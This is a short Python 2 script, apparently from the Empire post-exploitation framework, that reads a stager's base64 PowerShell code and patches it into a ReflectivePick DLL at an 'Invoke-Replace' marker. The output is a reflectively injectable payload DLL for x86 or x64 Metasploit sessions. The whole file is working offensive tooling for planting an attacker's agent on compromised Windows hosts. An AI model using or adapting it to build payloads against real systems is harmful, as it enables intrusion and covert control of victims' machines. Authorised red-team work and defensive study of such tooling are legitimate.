import sys
from lib.common import helpers
import os

def generate_dll(powershellCode, arch):
    #
    #Method to generate a reflective injectable DLL of Empire for Metasploit.
    #Read in original DLL and patch the bytes based on session arch.
    #
    if arch.lower() == 'x86':
        origPath = "%s/data/misc/ReflectivePick_x86_orig.dll" % (helpers.get_config('install_path'))
    elif arch.lower() == 'x64':
        origPath = "%s/data/misc/ReflectivePick_x64_orig.dll" % (helpers.get_config('install_path'))
     
    if os.path.isfile(origPath):
        dllRaw = ''
        with open(origPath, 'rb') as f:
            dllRaw = f.read()
            replacementCode = helpers.decode_base64(powershellCode)
            #
            #Patch the DLL with Empire PowerShell code
            #
            searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
            index = dllRaw.find(searchString)
            dllPatched = dllRaw[:index]+replacementCode+dllRaw[(index+len(replacementCode)):] 
            return dllPatched

        
    else:
        print helpers.color("[!] Original .dll for arch %s does not exist!" % (arch))

def main():
    stagerOutput = str(sys.argv[1])
    sessionArch = str(sys.argv[2])
    outFile = str(sys.argv[3])
    if os.path.isfile(stagerOutput):
        powershellCode = ''
        with open(stagerOutput, 'rb') as pay_file:
            powershellCode = pay_file.read()
    dll = generate_dll(powershellCode, sessionArch)
    out_file = open(outFile,'wb')
    out_file.write(bytearray(dll))
    out_file.close
main()

